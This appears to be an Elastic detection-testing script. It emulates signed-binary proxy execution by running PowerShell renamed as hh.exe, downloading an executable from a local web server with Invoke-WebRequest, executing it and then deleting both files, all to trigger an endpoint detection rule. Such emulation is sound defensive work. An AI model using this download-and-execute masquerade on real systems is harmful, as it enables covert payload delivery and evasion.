# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="9bbf9aea-33fc-45fc-be55-4cafc744da80",
    platforms=["windows"],
    endpoint=[
        {"rule_name": "File Execution via Microsoft HTML Help", "rule_id": "9c3b13f6-bc26-4397-9721-4ba23ddd1014"}
    ],
    siem=[],
    techniques=["T1218", "T1566"],
)

EXE_FILE = common.get_path("bin", "renamed_posh.exe")


@common.requires_os(metadata.platforms)
def main():
    server, ip, port = common.serve_web()
    url = f"http://{ip}:{port}/bin/renamed_posh.exe"

    hh = "C:\\Users\\Public\\hh.exe"
    dropped = "C:\\Users\\Public\\posh.exe"
    common.copy_file(EXE_FILE, hh)

    cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"

    # Execute command
    common.log("Using a fake hh to drop and execute an .exe")
    common.execute([hh, "/c", cmd], timeout=10)
    common.execute([hh, "/c", dropped], timeout=10, kill=True)
    common.remove_file(hh)
    common.remove_file(dropped)


if __name__ == "__main__":
    exit(main())
